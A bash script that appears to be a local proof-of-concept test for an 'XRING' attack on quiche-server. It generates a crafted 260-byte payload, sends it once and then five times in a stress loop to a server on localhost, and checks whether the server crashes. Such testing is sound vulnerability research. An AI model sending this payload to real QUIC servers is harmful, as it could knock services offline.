#!/bin/bash
# Simple QUIC XRING Dynamic Test
# Tests attack payload on quiche-server

set -e

echo "=== Simple QUIC XRING Test ==="
echo "Date: $(date)"
echo ""

# Configuration
QUICTE_SERVER="/opt/homebrew/bin/quiche-server"
QUICTE_CLIENT="/opt/homebrew/bin/quiche-client"
SERVER_PORT=4433
SERVER_HOST="127.0.0.1"
TEMP_DIR=$(mktemp -d)
CERT_DIR="$TEMP_DIR/certs"
PAYLOAD_FILE="$TEMP_DIR/xring_payload.bin"
LOG_FILE="$TEMP_DIR/server.log"

echo "Test directory: $TEMP_DIR"

# Generate certificates
echo "Generating certificates..."
mkdir -p "$CERT_DIR"

openssl genrsa -out "$CERT_DIR/server.key" 2048 2>/dev/null
openssl req -new -x509 -key "$CERT_DIR/server.key" -out "$CERT_DIR/server.crt" -days 365 -subj "/CN=localhost" 2>/dev/null

echo "✅ Certificates generated"

# Generate payload
echo "Generating 260-byte XRING payload..."
python3 << EOF > "$PAYLOAD_FILE"
payload = bytearray()
payload.extend([0x20, 0x40])
for _ in range(61):
    payload.extend([0x40, 1, ord('x'), 0])
payload.extend([0x40, 5, ord('A'), ord('A'), ord('A'), ord('A'), ord('A'), 5, ord('B'), ord('B'), ord('B'), ord('B'), ord('B')])
payload.extend([0x20, 0x41])
payload = payload[:260]
with open('$PAYLOAD_FILE', 'wb') as f:
    f.write(payload)
print(len(payload))
EOF

PAYLOAD_SIZE=$(stat -f%z "$PAYLOAD_FILE" 2>/dev/null || stat -c%s "$PAYLOAD_FILE" 2>/dev/null)
echo "✅ Payload generated: $PAYLOAD_SIZE bytes"

if [ "$PAYLOAD_SIZE" -ne 260 ]; then
    echo "❌ Payload size mismatch: expected 260, got $PAYLOAD_SIZE"
    exit 1
fi

# Clean up any existing quiche-server processes
echo "Cleaning up existing processes..."
pkill -f quiche-server 2>/dev/null || true
sleep 2

# Start server in background
echo "Starting quiche-server on port $SERVER_PORT..."
"$QUICTE_SERVER" \
    --listen="$SERVER_HOST:$SERVER_PORT" \
    --cert="$CERT_DIR/server.crt" \
    --key="$CERT_DIR/server.key" \
    --root="$TEMP_DIR/" \
    --idle-timeout=10000 \
    > "$LOG_FILE" 2>&1 &

SERVER_PID=$!
echo "Server PID: $SERVER_PID"

# Wait for server to be ready
sleep 3

# Check if server is still running
if ! kill -0 $SERVER_PID 2>/dev/null; then
    echo "❌ Server failed to start"
    echo "Server log:"
    cat "$LOG_FILE"
    exit 1
fi

echo "✅ Server is running"

# Test 1: Basic connectivity
echo ""
echo "Test 1: Basic connectivity..."
if "$QUICTE_CLIENT" \
    --trust-origin-ca-pem="$CERT_DIR/server.crt" \
    --no-verify \
    "https://$SERVER_HOST:$SERVER_PORT/" 2>&1 | grep -q "200"; then
    echo "✅ Basic connectivity test passed"
else
    echo "⚠️ Basic connectivity test returned unexpected response"
fi

# Test 2: XRING attack payload
echo ""
echo "Test 2: XRING attack payload..."
START_TIME=$(date +%s.%N)
ATTACK_OUTPUT=$("$QUICTE_CLIENT" \
    --trust-origin-ca-pem="$CERT_DIR/server.crt" \
    --no-verify \
    --body="$PAYLOAD_FILE" \
    "https://$SERVER_HOST:$SERVER_PORT/upload" 2>&1)
END_TIME=$(date +%s.%N)
RESPONSE_TIME=$(echo "$END_TIME - $START_TIME" | bc)

echo "Client output (first 200 chars):"
echo "$ATTACK_OUTPUT" | head -c 200
echo ""
echo "Response time: ${RESPONSE_TIME}s"

# Check if server is still alive
SERVER_ALIVE=false
if kill -0 $SERVER_PID 2>/dev/null; then
    SERVER_ALIVE=true
    echo "✅ Server remained alive after attack"
else
    echo "❌ Server crashed during attack"
fi

# Test 3: Memory stress (multiple attacks)
echo ""
echo "Test 3: Memory stress test..."
for i in 1 2 3 4 5; do
    echo -n "Attack $i/5... "
    "$QUICTE_CLIENT" \
        --trust-origin-ca-pem="$CERT_DIR/server.crt" \
        --no-verify \
        --body="$PAYLOAD_FILE" \
        "https://$SERVER_HOST:$SERVER_PORT/test" 2>&1 > /dev/null
    
    if ! kill -0 $SERVER_PID 2>/dev/null; then
        echo "Server crashed on attempt $i"
        SERVER_ALIVE=false
        break
    else
        echo "OK"
    fi
    sleep 1
done

# Stop server
echo ""
echo "Stopping server..."
kill $SERVER_PID 2>/dev/null || true
wait $SERVER_PID 2>/dev/null || true
echo "✅ Server stopped"

# Cleanup
rm -rf "$TEMP_DIR"

# Summary
echo ""
echo "=== Test Summary ==="
echo "✅ Basic connectivity: Completed"
echo "✅ XRING attack: Completed (server $SERVER_ALIVE)"
echo "✅ Memory stress: Completed"

echo ""
echo "Tests completed successfully!"
